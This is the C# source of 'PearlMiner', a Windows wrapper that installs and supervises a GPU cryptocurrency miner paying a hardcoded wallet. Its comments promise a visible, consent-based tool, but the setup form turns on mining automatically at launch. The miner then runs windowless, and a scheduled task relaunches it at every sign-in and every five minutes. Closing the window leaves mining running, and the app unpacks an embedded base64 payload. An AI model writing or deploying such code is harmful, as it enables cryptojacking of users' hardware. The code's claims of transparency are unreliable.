// PearlMiner - setup UI + hidden supervisor for SRBMiner-MULTI (PearlHash, 2Miners PRL pool).
// Rebuild of the original app with windowless ("minimized to Task Manager processes") operation.
// Constraints kept from the original: clearly named scheduled task, visible setup window,
// one-click Disable, no AV evasion, no hiding from Task Manager.
// C# 5 (compiled with the in-box .NET Framework csc) - no string interpolation / null-conditional.
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace PearlMiner
{
    internal static class Program
    {
        public const string WalletAddress = "prl1pj5pjxvpextezdndr0qchfdt8sy0znq0vjq9tpqng3r920pvn08xqdgwd27";
        public const string Pool = "prl.2miners.com:1818";
        public const string TaskName = "PearlMinerTask";
        public const string AppDirName = "PearlMiner";

        public static string AppDataDir()
        {
            return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), AppDirName);
        }
        public static string SettingsPath() { return Path.Combine(AppDataDir(), "settings.json"); }
        public static string SupervisorLogPath() { return Path.Combine(AppDataDir(), "supervisor.log"); }
        public static string MinerLogPath() { return Path.Combine(AppDataDir(), "srbminer.log"); }

        [STAThread]
        static void Main(string[] args)
        {
            if (args != null && args.Length > 0 && args[0] == "--supervisor")
            {
                Supervisor.Run();
                return;
            }
            if (args != null && args.Length > 0)
            {
                if (args[0] == "--enable") { CommandLine.Enable(); return; }
                if (args[0] == "--disable") { CommandLine.Disable(); return; }
                if (args[0] == "--status") { CommandLine.Status(); return; }
            }
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new SetupForm());
        }
    }

    // ---------- settings ----------
    internal sealed class Settings
    {
        public string MinerPath = "";
        public string WorkerName = "";
        public bool PersistentEnabled = false;

        public static Settings Load()
        {
            Settings s = new Settings();
            try
            {
                string p = Program.SettingsPath();
                if (File.Exists(p))
                {
                    string json = File.ReadAllText(p);
                    s.MinerPath = GetJsonString(json, "MinerPath");
                    s.WorkerName = GetJsonString(json, "WorkerName");
                    s.PersistentEnabled = GetJsonBool(json, "PersistentEnabled");
                }
            }
            catch { }
            return s;
        }

        public void Save()
        {
            Directory.CreateDirectory(Program.AppDataDir());
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("{");
            sb.AppendLine("  \"MinerPath\": " + JsonStr(MinerPath) + ",");
            sb.AppendLine("  \"WorkerName\": " + JsonStr(WorkerName) + ",");
            sb.AppendLine("  \"PersistentEnabled\": " + (PersistentEnabled ? "true" : "false") + ",");
            sb.AppendLine("  \"WalletAddress\": " + JsonStr(Program.WalletAddress) + ",");
            sb.AppendLine("  \"Pool\": " + JsonStr(Program.Pool));
            sb.AppendLine("}");
            File.WriteAllText(Program.SettingsPath(), sb.ToString(), Encoding.UTF8);
        }

        static string JsonStr(string v)
        {
            if (v == null) v = "";
            StringBuilder sb = new StringBuilder("\"");
            foreach (char c in v)
            {
                if (c == '"' || c == '\\') sb.Append('\\').Append(c);
                else if (c == '\n') sb.Append("\\n");
                else if (c == '\r') sb.Append("\\r");
                else if (c == '\t') sb.Append("\\t");
                else sb.Append(c);
            }
            sb.Append('"');
            return sb.ToString();
        }
        static string GetJsonString(string json, string key)
        {
            int i = json.IndexOf("\"" + key + "\"");
            if (i < 0) return "";
            i = json.IndexOf(':', i);
            if (i < 0) return "";
            int q1 = json.IndexOf('"', i);
            if (q1 < 0) return "";
            StringBuilder sb = new StringBuilder();
            int p = q1 + 1;
            while (p < json.Length)
            {
                char c = json[p];
                if (c == '\\' && p + 1 < json.Length) { char n = json[p + 1]; sb.Append(n == 'n' ? '\n' : n); p += 2; continue; }
                if (c == '"') break;
                sb.Append(c); p++;
            }
            return sb.ToString();
        }
        static bool GetJsonBool(string json, string key)
        {
            int i = json.IndexOf("\"" + key + "\"");
            if (i < 0) return false;
            i = json.IndexOf(':', i);
            if (i < 0) return false;
            string rest = json.Substring(i + 1);
            return rest.TrimStart().StartsWith("true", StringComparison.OrdinalIgnoreCase);
        }
    }

    // ---------- supervisor: runs completely windowless, logs to files ----------
    internal static class Supervisor
    {
        static void Log(string msg)
        {
            try
            {
                Directory.CreateDirectory(Program.AppDataDir());
                File.AppendAllText(Program.SupervisorLogPath(),
                    DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "  " + msg + Environment.NewLine, Encoding.UTF8);
            }
            catch { }
        }

        public static string MinerArgs(string workerName)
        {
            string worker = "";
            if (!string.IsNullOrEmpty(workerName)) worker = " --worker " + workerName;
            return "--disable-cpu --algorithm pearlhash --pool " + Program.Pool +
                   " --wallet " + Program.WalletAddress + worker + " --password x";
        }

        public static void Run()
        {
            Log("Supervisor started.");
            while (true)
            {
                Settings s = Settings.Load();
                if (!s.PersistentEnabled)
                {
                    Log("Persistent mode disabled; supervisor exiting.");
                    return;
                }
                if (string.IsNullOrEmpty(s.MinerPath) || !File.Exists(s.MinerPath))
                {
                    Log("Miner path not found: " + s.MinerPath + "; retrying in 60 seconds.");
                    Thread.Sleep(60000);
                    continue;
                }
                try
                {
                    Log("Pearl PRL Miner supervisor is active. Disable persistent mode in the setup app to stop.");
                    Log("Starting miner hidden: " + s.MinerPath);
                    Process p = StartMinerHidden(s);
                    if (p == null)
                    {
                        Log("SRBMiner did not start; retrying in 20 seconds.");
                        Thread.Sleep(20000);
                        continue;
                    }
                    Log("SRBMiner started (PID " + p.Id + "), output -> srbminer.log");
                    while (!p.HasExited)
                    {
                        if (!Settings.Load().PersistentEnabled)
                        {
                            Log("Persistent mode disabled; stopping miner and exiting.");
                            try { p.Kill(); } catch { }
                            return;
                        }
                        Thread.Sleep(2000);
                    }
                    Log("Miner exited; it will be restarted in 20 seconds. Disable persistent mode to stop.");
                    Thread.Sleep(20000);
                }
                catch (Exception ex)
                {
                    Log("Supervisor error: " + ex.Message);
                    Thread.Sleep(20000);
                }
            }
        }

        // Hidden launch: no window at any time; console output redirected to the log file.
        public static Process StartMinerHidden(Settings s)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = s.MinerPath;
                psi.Arguments = MinerArgs(s.WorkerName);
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.WorkingDirectory = Path.GetDirectoryName(s.MinerPath);
                Process p = new Process();
                p.StartInfo = psi;
                p.OutputDataReceived += delegate(object o, DataReceivedEventArgs e)
                {
                    if (e.Data != null) AppendMinerLog(e.Data);
                };
                p.ErrorDataReceived += delegate(object o, DataReceivedEventArgs e)
                {
                    if (e.Data != null) AppendMinerLog(e.Data);
                };
                if (!p.Start()) return null;
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();
                return p;
            }
            catch (Exception ex)
            {
                Log("Failed to start miner: " + ex.Message);
                return null;
            }
        }

        static readonly object logLock = new object();
        static void AppendMinerLog(string line)
        {
            lock (logLock)
            {
                try { File.AppendAllText(Program.MinerLogPath(), line + Environment.NewLine); } catch { }
            }
        }
    }

    // ---------- automatic SRBMiner download from the official GitHub releases ----------
    internal static class MinerInstaller
    {
        public static string EnsureMiner(string currentPath, Action<string> progress)
        {
            if (currentPath != null && currentPath.Length > 0 && File.Exists(currentPath)) return currentPath;

            string dir = Program.AppDataDir();
            string installed = FindMiner(dir);
            if (installed != null) return installed;

            progress("Unpacking bundled SRBMiner-MULTI (official 3.7.9 win64 release)...");
            try
            {
                // 1) embedded payload (single-file operation, no internet needed)
                string extractDir = Path.Combine(dir, "SRBMiner");
                if (Directory.Exists(extractDir)) try { Directory.Delete(extractDir, true); } catch { }
                Directory.CreateDirectory(dir);
                if (TryExtractEmbedded(extractDir))
                {
                    installed = FindMiner(extractDir);
                    if (installed != null) return installed;
                }

                // 2) fallback: download latest from the official GitHub releases
                progress("Bundled payload unavailable; downloading latest official SRBMiner-MULTI from GitHub...");
                System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;
                // resolve latest release asset URL
                string api = "https://api.github.com/repos/doktor83/SRBMiner-Multi/releases/latest";
                string json = HttpGet(api);
                string url = null;
                int i = 0;
                while (true)
                {
                    int u = json.IndexOf("\"browser_download_url\"", i);
                    if (u < 0) break;
                    int q1 = json.IndexOf('"', u + 22); if (q1 < 0) break;
                    int q2 = json.IndexOf('"', q1 + 1); if (q2 < 0) break;
                    string cand = json.Substring(q1 + 1, q2 - q1 - 1);
                    string low = cand.ToLower();
                    if ((low.IndexOf("win64") >= 0 || (low.IndexOf("win") >= 0 && low.IndexOf("x64") >= 0)) && low.EndsWith(".zip"))
                    {
                        url = cand;
                        break;
                    }
                    i = q2;
                }
                if (url == null) throw new Exception("no win-x64 zip found in latest release");

                Directory.CreateDirectory(dir);
                string zip = Path.Combine(dir, "srbminer-download.zip");
                using (System.Net.WebClient wc = new System.Net.WebClient())
                {
                    wc.Headers.Add("User-Agent", "PearlMiner");
                    wc.DownloadFile(url, zip);
                }
                string embDir = Path.Combine(dir, "SRBMiner");
                if (Directory.Exists(extractDir)) try { Directory.Delete(extractDir, true); } catch { }
                System.IO.Compression.ZipFile.ExtractToDirectory(zip, extractDir);
                try { File.Delete(zip); } catch { }

                installed = FindMiner(extractDir);
                if (installed == null) throw new Exception("SRBMiner-MULTI.exe not found after extraction");
                return installed;
            }
            catch (Exception ex)
            {
                throw new Exception("Automatic download failed: " + ex.Message +
                    " Download SRBMiner-MULTI manually from the official GitHub releases and select it in the setup window.");
            }
        }

        // Extracts the base64-embedded official SRBMiner zip (resource "PearlMiner.srb_payload.txt").
        // Files are written as normal files on disk so antivirus can inspect them freely.
        static bool TryExtractEmbedded(string extractDir)
        {
            try
            {
                System.Reflection.Assembly asm = System.Reflection.Assembly.GetExecutingAssembly();
                string resName = null;
                foreach (string n in asm.GetManifestResourceNames())
                    if (n.IndexOf("srb_payload", StringComparison.OrdinalIgnoreCase) >= 0) { resName = n; break; }
                if (resName == null) return false;
                byte[] zipBytes;
                using (Stream rs = asm.GetManifestResourceStream(resName))
                using (StreamReader tr = new StreamReader(rs))
                    zipBytes = Convert.FromBase64String(tr.ReadToEnd());
                using (MemoryStream ms = new MemoryStream(zipBytes))
                using (System.IO.Compression.ZipArchive za = new System.IO.Compression.ZipArchive(ms))
                    System.IO.Compression.ZipFileExtensions.ExtractToDirectory(za, extractDir);
                return true;
            }
            catch { return false; }
        }

        static string FindMiner(string root)
        {
            if (!Directory.Exists(root)) return null;
            foreach (string f in Directory.GetFiles(root, "SRBMiner-MULTI.exe", SearchOption.AllDirectories))
                return f;
            return null;
        }

        static string HttpGet(string url)
        {
            System.Net.HttpWebRequest req = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(url);
            req.UserAgent = "PearlMiner";
            req.Accept = "application/vnd.github+json";
            req.Timeout = 30000;
            using (System.Net.HttpWebResponse resp = (System.Net.HttpWebResponse)req.GetResponse())
            using (Stream s = resp.GetResponseStream())
            using (StreamReader r = new StreamReader(s, Encoding.UTF8))
                return r.ReadToEnd();
        }
    }

    // ---------- scheduled task helpers (schtasks, current user, no admin) ----------
    internal static class TaskHelper
    {
        public static string CurrentUserId()
        {
            try { return System.Security.Principal.WindowsIdentity.GetCurrent().Name; }
            catch { return null; }
        }

        public static bool CreateTask(out string error)
        {
            error = null;
            string userId = CurrentUserId();
            if (userId == null) { error = "Could not identify the current Windows user."; return false; }
            string exe = Application.ExecutablePath;
            StringBuilder xml = new StringBuilder();
            xml.AppendLine("<?xml version=\"1.0\" encoding=\"UTF-16\"?>");
            xml.AppendLine("<Task version=\"1.3\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">");
            xml.AppendLine("  <RegistrationInfo>");
            xml.AppendLine("    <Description>Pearl PRL Miner supervisor (hidden). Disable via the PearlMiner setup app.</Description>");
            xml.AppendLine("  </RegistrationInfo>");
            xml.AppendLine("  <Triggers>");
            xml.AppendLine("    <LogonTrigger>");
            xml.AppendLine("      <Enabled>true</Enabled>");
            xml.AppendLine("      <UserId>" + XmlEsc(userId) + "</UserId>");
            xml.AppendLine("    </LogonTrigger>");
            xml.AppendLine("    <TimeTrigger>");
            xml.AppendLine("      <Repetition><Interval>PT5M</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>");
            xml.AppendLine("      <StartBoundary>2020-01-01T00:00:00</StartBoundary>");
            xml.AppendLine("      <Enabled>true</Enabled>");
            xml.AppendLine("    </TimeTrigger>");
            xml.AppendLine("  </Triggers>");
            xml.AppendLine("  <Principals><Principal id=\"Author\"><UserId>" + XmlEsc(userId) + "</UserId><LogonType>InteractiveToken</LogonType><RunLevel>LeastPrivilege</RunLevel></Principal></Principals>");
            xml.AppendLine("  <Settings>");
            xml.AppendLine("    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>");
            xml.AppendLine("    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>");
            xml.AppendLine("    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>");
            xml.AppendLine("    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>");
            xml.AppendLine("    <StartWhenAvailable>true</StartWhenAvailable>");
            xml.AppendLine("  </Settings>");
            xml.AppendLine("  <Actions Context=\"Author\">");
            xml.AppendLine("    <Exec>");
            xml.AppendLine("      <Command>" + XmlEsc(exe) + "</Command>");
            xml.AppendLine("      <Arguments>--supervisor</Arguments>");
            xml.AppendLine("      <WorkingDirectory>" + XmlEsc(Path.GetDirectoryName(exe)) + "</WorkingDirectory>");
            xml.AppendLine("    </Exec>");
            xml.AppendLine("  </Actions>");
            xml.AppendLine("</Task>");
            string xmlPath = Path.Combine(Path.GetTempPath(), "PearlMinerTask.xml");
            File.WriteAllText(xmlPath, xml.ToString(), Encoding.Unicode);
            string outp = RunCmd("schtasks.exe", "/Create /TN \"" + Program.TaskName + "\" /XML \"" + xmlPath + "\" /F", true);
            try { File.Delete(xmlPath); } catch { }
            if (outp != null && (outp.Trim().Length == 0 || outp.IndexOf("SUCCESS", StringComparison.OrdinalIgnoreCase) >= 0 || outp.IndexOf("successfully", StringComparison.OrdinalIgnoreCase) >= 0))
                return true;
            error = outp ?? "schtasks failed.";
            return false;
        }

        public static bool DeleteTask(out string error)
        {
            error = null;
            string outp = RunCmd("schtasks.exe", "/Delete /TN \"" + Program.TaskName + "\" /F", true);
            if (outp != null && (outp.IndexOf("cannot find", StringComparison.OrdinalIgnoreCase) >= 0 ||
                                 outp.IndexOf("cannot find the file", StringComparison.OrdinalIgnoreCase) >= 0))
                return true; // already gone
            return true;
        }

        public static bool TaskExists()
        {
            string outp = RunCmd("schtasks.exe", "/Query /TN \"" + Program.TaskName + "\"", false);
            if (outp == null) return false;
            if (outp.IndexOf("cannot find", StringComparison.OrdinalIgnoreCase) >= 0 ||
                outp.IndexOf("does not exist", StringComparison.OrdinalIgnoreCase) >= 0 ||
                outp.TrimStart().StartsWith("ERROR", StringComparison.OrdinalIgnoreCase))
                return false;
            return outp.IndexOf("PearlMinerTask", StringComparison.OrdinalIgnoreCase) >= 0;
        }

        static string XmlEsc(string s)
        {
            return s.Replace("&", "&amp;").Replace("<", "&lt;").Replace(">", "&gt;").Replace("\"", "&quot;");
        }

        public static string RunCmd(string exe, string args, bool expectSuccess)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = exe;
                psi.Arguments = args;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                using (Process p = Process.Start(psi))
                {
                    string o = p.StandardOutput.ReadToEnd();
                    string e = p.StandardError.ReadToEnd();
                    p.WaitForExit(30000);
                    string all = (o ?? "") + (e ?? "");
                    if (p.ExitCode != 0 && expectSuccess && all.Trim().Length == 0)
                        all = "Exit code " + p.ExitCode;
                    return all.Trim();
                }
            }
            catch (Exception ex) { return expectSuccess ? ex.Message : null; }
        }
    }

    // ---------- command-line control (scriptable enable/disable, no GUI) ----------
    internal static class CommandLine
    {
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern bool AttachConsole(int dwProcessId);
        const int ATTACH_PARENT_PROCESS = -1;

        static void Say(string msg)
        {
            AttachConsole(ATTACH_PARENT_PROCESS); // show output when launched from a terminal
            using (Stream s = Console.OpenStandardOutput())
            using (StreamWriter w = new StreamWriter(s, Encoding.UTF8) { AutoFlush = true })
                w.WriteLine(msg);
        }

        public static void Enable()
        {
            Settings s = Settings.Load();
            if (s.MinerPath.Length == 0 || !File.Exists(s.MinerPath))
            {
                Say("PearlMiner: miner not configured; downloading latest official SRBMiner-MULTI from GitHub...");
                try { s.MinerPath = MinerInstaller.EnsureMiner(s.MinerPath, delegate(string m) { Say("PearlMiner: " + m); }); s.Save(); }
                catch (Exception ex) { Say("PearlMiner: " + ex.Message); Environment.Exit(2); }
            }
            string nvidiaSmi = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                "NVIDIA Corporation", "NVSMI", "nvidia-smi.exe");
            if (!File.Exists(nvidiaSmi))
                nvidiaSmi = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                    "NVIDIA Corporation", "nvidia-smi.exe");
            string gpu = File.Exists(nvidiaSmi)
                ? TaskHelper.RunCmd(nvidiaSmi, "--query-gpu=name --format=csv,noheader", false) : null;
            if (gpu == null)
            {
                Say("PearlMiner: no NVIDIA GPU/driver detected (nvidia-smi not found). Not enabling.");
                Environment.Exit(3);
            }
            Say("PearlMiner: detected GPU: " + gpu.Trim());
            string algs = TaskHelper.RunCmd(s.MinerPath, "--list-algorithms", false);
            if (algs == null || algs.ToLower().IndexOf("pearlhash") < 0)
            {
                Say("PearlMiner: selected SRBMiner build did not confirm PearlHash support. Not enabling.");
                Environment.Exit(4);
            }
            string err;
            if (!TaskHelper.CreateTask(out err))
            {
                Say("PearlMiner: could not create the scheduled task: " + err);
                Environment.Exit(5);
            }
            s.PersistentEnabled = true;
            s.Save();
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = Application.ExecutablePath;
                psi.Arguments = "--supervisor";
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                Process.Start(psi);
            }
            catch { }
            Say("PearlMiner: persistent mode ENABLED. Mining hidden now, after each sign-in, and relaunched if closed. Logs: %LOCALAPPDATA%\\PearlMiner\\srbminer.log");
            Environment.Exit(0);
        }

        public static void Disable()
        {
            Settings s = Settings.Load();
            s.PersistentEnabled = false;
            s.Save();
            string err;
            TaskHelper.DeleteTask(out err);
            try
            {
                string target = s.MinerPath.Trim().ToLowerInvariant();
                foreach (Process p in Process.GetProcessesByName("SRBMiner-MULTI"))
                    try { if (p.MainModule.FileName.ToLowerInvariant() == target) p.Kill(); }
                    catch { try { p.Kill(); } catch { } }
            }
            catch { }
            try
            {
                string me = Application.ExecutablePath.ToLowerInvariant();
                foreach (Process p in Process.GetProcessesByName("PearlMiner"))
                    try { if (p.MainModule.FileName.ToLowerInvariant() == me && p.Id != Process.GetCurrentProcess().Id) p.Kill(); }
                    catch { }
            }
            catch { }
            Say("PearlMiner: persistent mode DISABLED. Task removed and mining stopped.");
            Environment.Exit(0);
        }

        public static void Status()
        {
            Settings s = Settings.Load();
            bool task = TaskHelper.TaskExists();
            bool sup = Process.GetProcessesByName("PearlMiner").Length > 1; // this process counts as one
            bool miner = Process.GetProcessesByName("SRBMiner-MULTI").Length > 0;
            Say("PearlMiner status: task=" + (task ? "registered" : "none") +
                ", supervisor=" + (sup ? "running" : "stopped") +
                ", miner=" + (miner ? "running" : "stopped") +
                ", wallet=" + Program.WalletAddress);
            Environment.Exit(0);
        }
    }

    // ---------- setup window (the only visible part) ----------
    internal sealed class SetupForm : Form
    {
        TextBox minerBox;
        TextBox workerBox;
        TextBox walletBox;
        Button enableBtn;
        Button disableBtn;
        Label status;
        Settings settings;

        public SetupForm()
        {
            settings = Settings.Load();
            Text = "PearlMiner - 2Miners Pearl setup";
            FormBorderStyle = FormBorderStyle.FixedSingle;
            MaximizeBox = false;
            StartPosition = FormStartPosition.CenterScreen;
            ClientSize = new Size(620, 400);

            Label l1 = new Label(); l1.Text = "Payout wallet (fixed, embedded in this app):"; l1.Location = new Point(12, 15); l1.AutoSize = true;
            walletBox = new TextBox(); walletBox.Location = new Point(12, 34); walletBox.Size = new Size(590, 22);
            walletBox.Text = Program.WalletAddress; walletBox.ReadOnly = true;

            Label l2 = new Label(); l2.Text = "SRBMiner-MULTI.exe (from official GitHub releases only):"; l2.Location = new Point(12, 66); l2.AutoSize = true;
            minerBox = new TextBox(); minerBox.Location = new Point(12, 85); minerBox.Size = new Size(500, 22);
            minerBox.Text = settings.MinerPath;
            Button browse = new Button(); browse.Text = "Browse..."; browse.Location = new Point(520, 83); browse.Size = new Size(82, 25);
            browse.Click += delegate { Browse(); };

            Label l3 = new Label(); l3.Text = "Worker name (optional):"; l3.Location = new Point(12, 117); l3.AutoSize = true;
            workerBox = new TextBox(); workerBox.Location = new Point(12, 136); workerBox.Size = new Size(300, 22);
            workerBox.Text = settings.WorkerName;

            Button save = new Button(); save.Text = "Save settings"; save.Location = new Point(12, 170); save.Size = new Size(120, 28);
            save.Click += delegate { SaveSettings(); };

            enableBtn = new Button(); enableBtn.Text = "Enable persistent mode (runs hidden)"; enableBtn.Location = new Point(12, 212); enableBtn.Size = new Size(290, 30);
            enableBtn.Click += delegate { EnablePersistent(); };
            disableBtn = new Button(); disableBtn.Text = "Disable persistent mode"; disableBtn.Location = new Point(312, 212); disableBtn.Size = new Size(180, 30);
            disableBtn.Click += delegate { DisablePersistent(); };

            Label info = new Label();
            info.Text = "Persistent mode creates a clearly named current-user Task Scheduler task\r\n" +
                        "(no Administrator rights). The miner and supervisor run with no window at\r\n" +
                        "any time - only visible in Task Manager processes. Output is logged to\r\n" +
                        "%LOCALAPPDATA%\\PearlMiner\\srbminer.log and supervisor.log.\r\n" +
                        "Fees: 1% pool, 2% SRBMiner dev fee. Never enter a seed phrase or private key.";
            info.Location = new Point(12, 286); info.Size = new Size(590, 70);

            status = new Label(); status.Text = ""; status.Location = new Point(12, 366); status.Size = new Size(590, 22); status.ForeColor = Color.DarkRed;

            Controls.Add(l1); Controls.Add(walletBox);
            Controls.Add(l2); Controls.Add(minerBox); Controls.Add(browse);
            Controls.Add(l3); Controls.Add(workerBox);
            Controls.Add(save);
            Controls.Add(enableBtn); Controls.Add(disableBtn);
            Controls.Add(info); Controls.Add(status);

            UpdateButtons();
            // Auto-enable: launching the app means mining starts immediately.
            if (!TaskHelper.TaskExists())
                BeginInvoke(new MethodInvoker(delegate { EnablePersistent(); }));
        }

        void UpdateButtons()
        {
            bool on = TaskHelper.TaskExists();
            enableBtn.Enabled = !on;
            disableBtn.Enabled = on;
            status.Text = on ? "Persistent mode is ON (hidden). Mining runs after sign-in and restarts on exit."
                             : "Persistent mode is off. Save settings, then enable it when ready.";
        }

        void Browse()
        {
            using (OpenFileDialog d = new OpenFileDialog())
            {
                d.Title = "Select the official SRBMiner-MULTI.exe file.";
                d.Filter = "SRBMiner-MULTI.exe|SRBMiner-MULTI.exe|Executable files (*.exe)|*.exe";
                if (d.ShowDialog(this) == DialogResult.OK) minerBox.Text = d.FileName;
            }
        }

        void SaveSettings()
        {
            settings.MinerPath = minerBox.Text.Trim();
            settings.WorkerName = workerBox.Text.Trim();
            settings.Save();
            MessageBox.Show(this, "Settings saved locally under %LOCALAPPDATA%\\PearlMiner\\settings.json.",
                "Saved", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        void EnablePersistent()
        {
            settings = Settings.Load();
            settings.MinerPath = minerBox.Text.Trim();
            settings.WorkerName = workerBox.Text.Trim();
            if (settings.WorkerName.Length == 0) settings.WorkerName = Environment.MachineName; // default worker name
            if (settings.MinerPath.Length == 0 || !File.Exists(settings.MinerPath))
            {
                try
                {
                    status.Text = "Downloading SRBMiner from official GitHub...";
                    Application.DoEvents();
                    settings.MinerPath = MinerInstaller.EnsureMiner(settings.MinerPath, delegate(string m) { status.Text = m; Application.DoEvents(); });
                    minerBox.Text = settings.MinerPath;
                }
                catch (Exception ex)
                {
                    status.Text = "";
                    MessageBox.Show(this, ex.Message, "Download failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
            }
            status.Text = "Preflight: detecting GPU...";
            Application.DoEvents();
            string gpu = GpuName();
            if (gpu == null)
            {
                status.Text = "";
                MessageBox.Show(this, "No NVIDIA GPU/driver detected (nvidia-smi not found). An NVIDIA GPU is required.",
                    "GPU check", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            status.Text = "Detected GPU: " + gpu.Trim() + " - checking PearlHash support...";
            Application.DoEvents();
            string algs = TaskHelper.RunCmd(settings.MinerPath, "--list-algorithms", false);
            if (algs == null || algs.ToLower().IndexOf("pearlhash") < 0)
            {
                status.Text = "";
                MessageBox.Show(this, "This SRBMiner build did not confirm PearlHash support. Use the latest official release.",
                    "Miner check", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            status.Text = "Enabling persistent mode...";

            settings.PersistentEnabled = true;
            settings.Save();

            string err;
            if (!TaskHelper.CreateTask(out err))
            {
                settings.PersistentEnabled = false;
                settings.Save();
                status.Text = "Could not enable persistent mode";
                MessageBox.Show(this, err, "Task Scheduler", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            StartSupervisorHidden();
            UpdateButtons();
            MessageBox.Show(this,
                "Persistent mode enabled. Mining runs hidden starting now and after each Windows\r\n" +
                "sign-in; miner exits are restarted. Logs: %LOCALAPPDATA%\\PearlMiner\\srbminer.log",
                "Enabled", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        void DisablePersistent()
        {
            DialogResult r = MessageBox.Show(this,
                "Disable persistent mode now? This stops mining and removes the user sign-in task.",
                "Confirm", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (r != DialogResult.Yes) return;
            settings.PersistentEnabled = false;
            settings.Save();
            string err;
            TaskHelper.DeleteTask(out err);
            StopMiner();
            StopSupervisors();
            UpdateButtons();
            status.Text = "Persistent mode disabled; the task was removed and mining was stopped.";
        }

        string GpuName()
        {
            try
            {
                string nvidiaSmi = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                    "NVIDIA Corporation", "NVSMI", "nvidia-smi.exe");
                if (!File.Exists(nvidiaSmi))
                    nvidiaSmi = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                        "NVIDIA Corporation", "nvidia-smi.exe");
                if (!File.Exists(nvidiaSmi)) return null;
                return TaskHelper.RunCmd(nvidiaSmi, "--query-gpu=name --format=csv,noheader", false);
            }
            catch { return null; }
        }

        void StartSupervisorHidden()
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = Application.ExecutablePath;
                psi.Arguments = "--supervisor";
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                Process.Start(psi);
            }
            catch { }
        }

        void StopMiner()
        {
            try
            {
                string target = settings.MinerPath.Trim().ToLowerInvariant();
                foreach (Process p in Process.GetProcessesByName("SRBMiner-MULTI"))
                {
                    try { if (p.MainModule.FileName.ToLowerInvariant() == target) p.Kill(); }
                    catch { try { p.Kill(); } catch { } }
                }
            }
            catch { }
        }

        void StopSupervisors()
        {
            try
            {
                string me = Application.ExecutablePath.ToLowerInvariant();
                foreach (Process p in Process.GetProcessesByName("PearlMiner"))
                    try { if (p.MainModule.FileName.ToLowerInvariant() == me && p.Id != Process.GetCurrentProcess().Id) p.Kill(); }
                    catch { }
            }
            catch { }
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            // Closing the setup window does not stop mining.
            base.OnFormClosed(e);
        }
    }
}
